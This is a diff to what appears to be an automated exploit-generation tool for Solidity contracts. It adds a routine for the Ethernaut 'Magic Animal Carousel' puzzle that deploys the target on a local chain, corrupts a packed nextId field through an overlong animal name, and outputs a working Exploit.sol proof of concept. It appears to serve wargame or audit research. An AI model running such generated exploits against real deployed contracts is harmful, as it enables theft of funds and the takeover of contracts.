@@ -2557,6 +2557,83 @@ def _synth_eip7702_reentrancy(name, target_src, invariants_src, manifest, scan_s
             "ms":int((time.time()-t0)*1000)}
 
 
+def _synth_magic_carousel(name, target_src, invariants_src, manifest, scan_step, t0):
+    """Ethernaut Magic Animal Carousel 류: 패킹 슬롯(owner|nextId|animal)에서 changeAnimal 이
+    `encodedAnimal << 160` 로 동물 이름을 쓰면서 nextId 영역(bits 160-175)을 보존한다고
+    (`& NEXT_ID_MASK`) 주장하지만, 이름의 하위 바이트가 그 영역으로 흘러들어 링 포인터를
+    공격자 임의값으로 오염시킨다. 보존돼야 할 nextId 가 이름 입력만으로 바뀌는지로 증명한다."""
+    import solcx
+    from web3 import Web3
+    strip = _strip_comments(target_src)
+    bodies = _contract_bodies(strip)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    if not (re.search(r"function\s+setAnimalAndSpin", tb) and re.search(r"function\s+changeAnimal", tb)
+            and re.search(r"function\s+encodeAnimalName", tb) and re.search(r"\bcarousel\b", tb)):
+        return None
+    sm = re.search(r"NEXT_ID_MASK\s*=\s*uint256\(type\(uint16\)\.max\)\s*<<\s*(\d+)", tb)
+    shift = int(sm.group(1)) if sm else 160
+    _solcv, _evm = _solc_for(target_src)
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try: compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception: return None
+    arts = {}
+    for _fl, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+    if name not in arts:
+        return None
+    abi = arts[name]["abi"]
+    has_carousel = any(e.get("type")=="function" and e.get("name")=="carousel"
+                       and [i["type"] for i in e.get("inputs",[])]==["uint256"] for e in abi)
+    if not has_carousel:
+        return None
+    w3, acct = _mk_evm()
+    C = w3.eth.contract(abi=abi, bytecode=arts[name]["bin"])
+    try:
+        taddr = w3.eth.wait_for_transaction_receipt(
+            C.constructor(*[_default_for_type(t) for t in _abi_ctor_types(abi)]).transact({"from":acct,"gas":3_000_000})).contractAddress
+    except Exception:
+        return None
+    tc = w3.eth.contract(address=taddr, abi=abi)
+    def nextid(cid):
+        return (int(tc.functions.carousel(cid).call()) >> shift) & 0xFFFF
+    def ok(h):
+        try: return int(w3.eth.wait_for_transaction_receipt(h).status) == 1
+        except Exception: return False
+    try:
+        if not ok(tc.functions.setAnimalAndSpin("cat").transact({"from":acct,"gas":400_000})):
+            return None
+        cur = int(tc.functions.currentCrateId().call()) if _has_getter(abi, "currentCrateId") else 1
+        n0 = nextid(cur)
+        # 12자 ASCII: 하위 2바이트(index 10,11)가 nextId 영역으로 흘러든다
+        if not ok(tc.functions.changeAnimal("AAAAAAAAAABC", cur).transact({"from":acct,"gas":400_000})):
+            return None
+        n1 = nextid(cur)
+    except Exception:
+        return None
+    if n1 == n0:
+        return None
+    poc = (HEADER.replace(">=0.6.2", "^0.8.28") +
+        "// Strategy: Magic Animal Carousel. changeAnimal writes encodedAnimal<<160, so the\n"
+        "// name's low bytes bleed into the nextId field (bits 160-175) that the code claims\n"
+        "// to preserve — corrupting the carousel ring pointer to an attacker-chosen value.\n"
+        f"interface IC {{ function setAnimalAndSpin(string calldata) external; function changeAnimal(string calldata, uint256) external; function currentCrateId() external view returns (uint256); }}\n"
+        "contract Exploit {\n"
+        "    function run(address t) external {\n"
+        "        IC(t).setAnimalAndSpin(\"cat\");\n"
+        "        uint256 cur = IC(t).currentCrateId();\n"
+        "        IC(t).changeAnimal(\"AAAAAAAAAABC\", cur);  // low bytes B,C bleed into nextId\n"
+        "    }\n}\n")
+    gen = {"step":"generate","title":"Exploit.sol 생성 (magic-carousel)","strategy":"magic-carousel","exploit_src":poc}
+    return {"name":name,"proven":True,"firstViolated":f"carousel ring pointer corrupted (nextId {n0} → {n1} via animal-name bleed)",
+            "strategy":"magic-carousel:changeAnimal","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+            "note":"changeAnimal 의 encodedAnimal<<160 이 보존돼야 할 nextId 필드로 이름 바이트를 흘려보내 링 포인터를 임의값으로 오염시켰습니다.",
+            "ms":int((time.time()-t0)*1000)}
+
+
 def _synth_ecdsa_malleability(name, target_src, invariants_src, manifest, scan_step, t0):
     """Ethernaut Impersonator 류: ecrecover 로 권한(controller)을 확인하면서 소모 서명을
     정확한 (v,r,s) 로만 표시하고 s 정규화가 없다. 같은 서명자를 복구하는 대칭 서명
@@ -4658,6 +4735,13 @@ def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_s
             return r
     except Exception:
         pass
+    # 0z3) Magic Animal Carousel (패킹 슬롯 nextId 오염)
+    try:
+        r = _synth_magic_carousel(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
     # 0z2) Impersonator (ECDSA 서명 가변성 → controller 탈취)
     try:
         r = _synth_ecdsa_malleability(name, target_src, invariants_src, manifest, scan_step, t0)
@@ -4783,7 +4867,8 @@ def iter_engine_candidates(name, target_src, invariants_src, manifest, do_verify
                _synth_higher_order, _synth_switch, _synth_array_underflow,
                _synth_dex_two_drain, _synth_dex_drain, _synth_good_samaritan,
                _synth_eip7702_reentrancy, _synth_gatekeeper_three, _synth_stake_accounting,
-               _synth_uninitialized, _synth_puzzle_wallet, _synth_ecdsa_malleability):
+               _synth_uninitialized, _synth_puzzle_wallet, _synth_ecdsa_malleability,
+               _synth_magic_carousel):
         try:
             r = fn(name, target_src, inv, manifest, scan_step, t0)
         except Exception:
